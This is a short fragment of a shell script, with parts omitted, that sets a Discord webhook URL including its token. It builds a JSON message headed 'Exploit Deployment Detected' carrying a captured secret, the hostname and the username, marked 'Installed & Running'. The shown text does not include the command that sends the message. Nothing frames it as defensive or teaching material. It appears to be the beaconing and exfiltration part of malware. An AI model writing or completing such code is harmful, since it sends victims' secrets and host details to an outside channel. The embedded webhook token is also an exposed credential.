...
WEBHOOK="https://discord.com/api/webhooks/1550229321472413737/LltbVk8gLALACy7XTqGwAgXxPNaUW0UAUg7jqVm1qTqkda71Zc7q722OKToWY31cxZ0W"
...
payload=$(cat <<EOF
{
  "content": "**[!] Exploit Deployment Detected**\n**Secret:** \`$SECRET\`\n**Host:** $(hostname)\n**User:** $(whoami)\n**Status:** Installed & Running"
}
EOF
)
